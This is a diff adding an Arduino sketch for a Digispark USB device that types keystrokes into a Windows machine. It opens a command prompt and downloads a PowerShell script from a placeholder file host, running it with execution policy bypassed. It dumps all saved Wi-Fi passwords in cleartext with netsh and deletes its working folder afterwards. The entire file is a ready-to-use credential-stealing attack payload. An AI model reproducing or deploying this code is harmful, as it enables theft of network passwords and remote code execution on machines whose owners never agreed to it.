@@ -1,0 +1,50 @@
+#include "DigiKeyboard.h"
+/* Init function */
+void setup()
+{
+  pinMode(1, OUTPUT); //LED on Model A
+  digitalWrite(1, HIGH);
+  DigiKeyboard.delay(500);
+  digitalWrite(1, LOW);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("cmd");
+  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("cd / & mkdir wifi & cd /wifi & echo (wget '(YOUR FILE HOST)' -OutFile maintenance.ps1) > b.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  
+  DigiKeyboard.println("netsh wlan show profile * key=clear > c:/wifi/passwords.txt");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.println("powershell ./maintenance.ps1");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("cd C:/");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.println("rmdir /Q /S wifi");
+  DigiKeyboard.delay(50);
+  DigiKeyboard.println("exit");
+  DigiKeyboard.delay(50);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  digitalWrite(1, HIGH);
+}
+
+/* Unused endless loop */
+void loop() {}
